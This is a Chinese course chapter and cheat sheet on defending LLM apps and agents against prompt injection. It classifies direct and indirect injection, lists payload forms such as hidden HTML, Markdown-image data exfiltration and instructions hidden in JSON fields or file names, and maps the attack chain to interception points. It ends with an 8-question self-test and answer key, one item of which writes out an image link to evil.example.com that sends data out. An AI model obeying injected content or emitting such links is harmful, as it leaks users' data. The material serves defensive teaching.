# C8-4 · 提示词安全速查与自测
> 阅读约 10 分钟。这一篇把 C8 压成能查、能自测的东西。

## 1. 注入分类速查

| 类型 | 攻击者位置 | 目标 | 防御难度 |
|---|---|---|---|
| 直接注入 | 与模型对话的人 | 套 system prompt、绕过规则 | 易（可见、可过滤） |
| 间接注入 | 藏在数据/网页/邮件里 | 数据泄露、越权、输出污染 | 难（Agent 特有风险） |

根因：模型分不清「数据」和「指令」，防御 = 人为划信任边界。

## 2. 三层防御

| 层 | 手段 | 作用 |
|---|---|---|
| 入口层 | 数据清洗、去控制字符、限长 | 降噪 |
| 上下文层 | 隔离标记 + 「视为数据」声明 | 划边界、提成本 |
| 权限层 | 工具白名单、人工确认、输出过滤 | **真正的兜底** |

三层各防不同的东西：入口防脏数据，上下文防"顺手执行"，权限层防"执行了之后怎么办"。**只有权限层是不可绕过的**。

## 3. 载荷形态速查

| 形态 | 特征 | 对应防御 |
|---|---|---|
| 不可见内容 | HTML 注释、白字、`display:none` | 解析后取纯文本，丢弃样式与注释 |
| 图片链接外带 | Markdown 图片 URL 带数据 | 重写或拦截图片链接（出口层） |
| 结构化字段藏毒 | JSON 值里写指令 | 字段值当数据、不当指令；不直接拼进 prompt |
| 文件名 / metadata | 文件名本身就是指令 | 文件名不进 system；必要时重命名 |

## 4. 攻击链 → 拦截点对照

一条完整攻击链是「检索到毒内容 → 模型相信 → 调工具 → 数据出去」。每一环都有拦截点，且越往后越硬：

| 环节 | 拦截手段 | 硬度 |
|---|---|---|
| 内容进入上下文前 | 清洗、限长、来源白名单 | 软（可绕过） |
| 上下文里 | 隔离标记 + 声明 | 软（提成本） |
| 模型要调工具时 | 工具不在列表 / 参数白名单 | **硬** |
| 工具真要执行前 | 人工确认（显示参数与来源） | **硬** |
| 数据要流出时 | 输出过滤、图片链接重写 | 中（只挡已知模式） |

判断你的系统安不安全，只看一件事：**这条链上有没有至少两个「硬」拦截点**。只有软拦截的系统，等于没防御。

## 5. 自测（8 道）

> 答对 6 道以上，本课通过。

1. 提示词注入和越狱（jailbreak）的区别是什么？为什么换更强的模型消不掉注入？
2. 为什么间接注入是 Agent 的特有风险？
3. 隔离标记 + 「视为数据」声明，为什么只能「降噪」不能「彻底防御」？
4. 用随机标记（`<doc-7f3a>`）能防住什么、防不住什么？还缺哪一步？
5. 为什么「危险工具不放进 tools 数组」是最可靠的白名单手段？
6. 什么操作需要加「人工确认」闸门？确认框里最该显示什么？
7. 输出过滤拦不住什么？它应该被放在防御的什么位置？
8. 模型输出一句 `![](https://evil.example.com/?d=... )`，风险是什么？在哪一层拦？

### 答案要点

1. 越狱是绕过安全对齐；注入是利用模型的指令遵循，让攻击者内容被当成指令执行。注入不依赖模型"变坏"，只依赖它"照做"，所以对齐更强也挡不住。
2. Agent 会主动读外部内容并据此行动，攻击面比不读外部内容的聊天助手大得多。
3. 隔离标记本身也是上下文里的 token，攻击者能模仿标记提前闭合，对抗会升级；所以它只能提高成本、不能绝对阻断。
4. 能防住伪造闭合（随机串猜不到），防不住模型被说服忽略分隔符。还缺两件事：拼接前把内容里所有类标记字符串消掉（正则只是降噪），以及把真正的兜底放到权限层（C8-3）。
5. 模型只能调用放进 tools 的工具，根本不放进去，模型连尝试的机会都没有。
6. 有副作用、不可逆、影响面大的操作：发邮件、转账、删数据（任举两个）；确认框应显示具体动作、关键参数原文、指令来源、不可撤销提示。
7. 拦不住「新出现、未识别」的泄露模式；它是事后兜底，不能替代白名单和权限层。
8. 渲染时浏览器会请求该 URL，数据随 query 外带，属于不可撤回的泄露；应在出口层重写或拦截 Markdown 图片链接。

## 6. 阶段 1 结课

到这里，你学完了阶段 1 全部三课（C6 / C7 / C8），拿到了三件交付物：

1. 一套五段式 system prompt 模板（C6）。
2. 一套有明确规则的上下文裁剪策略（C7）。
3. 一份注入防御清单（C8）。

三件交付物都能用一句话验收：

| 交付物 | 验收标准 |
|---|---|
| system prompt 模板 | 覆盖问答 / 抽取 / 改写三类任务，带版本号，约束条条可配出违反样例 |
| 裁剪策略 | 写清预算数字、触发阈值、裁剪顺序，且数字来自自己的 usage 统计 |
| 防御清单 | 至少两个「硬」拦截点（工具不在列表、确认在副作用之前、参数白名单任一） |

对照阶段出口标准自查（见本阶段 README），三项都齐了，就可以进入**阶段 2 · Agent 最小闭环**——第一次真正让模型自己决定下一步。
